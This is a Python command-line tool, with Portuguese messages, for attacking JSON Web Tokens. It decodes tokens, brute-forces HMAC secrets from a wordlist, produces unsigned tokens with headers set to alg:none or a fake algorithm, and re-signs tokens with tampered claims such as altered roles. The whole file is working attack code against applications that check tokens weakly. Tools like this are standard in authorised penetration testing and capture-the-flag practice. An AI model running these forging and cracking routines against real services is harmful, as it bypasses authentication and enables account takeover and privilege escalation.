import jwt
import json
import base64
import argparse
from jwt.exceptions import InvalidSignatureError

def decode_base64url(data):
    rem = len(data) % 4
    if rem > 0:
        data += '=' * (4 - rem)
    return base64.urlsafe_b64decode(data).decode()

def show_token(token):
    try:
        header_b64, payload_b64, _ = token.split('.')
        header = json.loads(decode_base64url(header_b64))
        payload = json.loads(decode_base64url(payload_b64))
        print("\n Header:")
        print(json.dumps(header, indent=2))
        print("\n Payload:")
        print(json.dumps(payload, indent=2))
    except Exception as e:
        print(f" Erro ao decodificar token: {e}")

def brute_force_key(token, wordlist_path, alg='HS256'):
    header_b64, payload_b64, signature = token.split('.')
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                secret = line.strip()
                print(f"\r Testando: {secret[:60]:60}", end='', flush=True)
                try:
                    jwt.decode(token, secret, algorithms=[alg])
                    print(f"\n Chave encontrada: {secret}")
                    return secret
                except InvalidSignatureError:
                    continue
                except Exception:
                    continue
    except FileNotFoundError:
        print(f" Wordlist não encontrada: {wordlist_path}")
    print("\n Nenhuma chave válida encontrada.")
    return None

def none_attack(token):
    header_b64, payload_b64, _ = token.split('.')
    fake_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip('=')
    return f"{fake_header}.{payload_b64}."

def null_signature(token):
    header_b64, payload_b64, _ = token.split('.')
    fake_header = base64.urlsafe_b64encode(json.dumps({"alg": "FAKE"}).encode()).decode().rstrip('=')
    return f"{fake_header}.{payload_b64}."

def forge_token(token, secret, alg, tamper_json):
    try:
        header_b64, payload_b64, _ = token.split('.')
        payload = json.loads(decode_base64url(payload_b64))
        payload.update(tamper_json)
        new_token = jwt.encode(payload, secret, algorithm=alg)
        print("\n Token forjado com sucesso:\n")
        print(new_token)
    except Exception as e:
        print(f" Erro ao processar token: {e}")

# Argument parser
parser = argparse.ArgumentParser(description="Forge & Tamper JWT tokens")
parser.add_argument('-t', '--token', help='Token JWT original')
parser.add_argument('-p', '--password', help='Chave secreta (descoberta ou conhecida)')
parser.add_argument('-alg', '--algorithm', default='HS256', help='Algoritmo (default: HS256)')
parser.add_argument('-d', '--data', help='Payload JSON para modificar claims')
parser.add_argument('-s', '--show', action='store_true', help='Mostrar o token decodificado')
parser.add_argument('-w', '--wordlist', help='Wordlist para brute force do segredo')
parser.add_argument('-na', '--noneattack', action='store_true', help='Realizar ataque alg:none')
parser.add_argument('-ns', '--nullsignature', action='store_true', help='Realizar ataque null signature')

args = parser.parse_args()

# Execução
if args.show and args.token:
    show_token(args.token)

elif args.wordlist and args.token:
    brute_force_key(args.token, args.wordlist, args.algorithm)

elif args.noneattack and args.token:
    print("\n Ataque alg:none:\n")
    print(none_attack(args.token))

elif args.nullsignature and args.token:
    print("\n Ataque null signature:\n")
    print(null_signature(args.token))

elif args.token and args.password and args.data:
    try:
        tamper_json = json.loads(args.data)
        forge_token(args.token, args.password, args.algorithm.upper(), tamper_json)
    except json.JSONDecodeError as e:
        print(" JSON inválido para o payload:", e)
else:
    parser.print_help()